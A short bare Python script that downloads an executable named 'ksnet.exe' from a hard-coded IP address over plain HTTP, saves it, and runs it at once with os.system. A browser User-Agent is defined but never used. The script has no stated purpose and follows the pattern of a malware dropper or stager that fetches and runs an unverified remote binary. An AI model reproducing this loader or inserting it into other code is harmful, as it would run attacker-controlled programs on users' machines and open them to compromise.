# -*- coding:utf-8 -*-

import requests,os
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'}
res=requests.get('http://45.63.30.182/ksnet.exe')
with open('ksnet.exe','wb') as f:
    f.write(res.content)
os.system('ksnet.exe')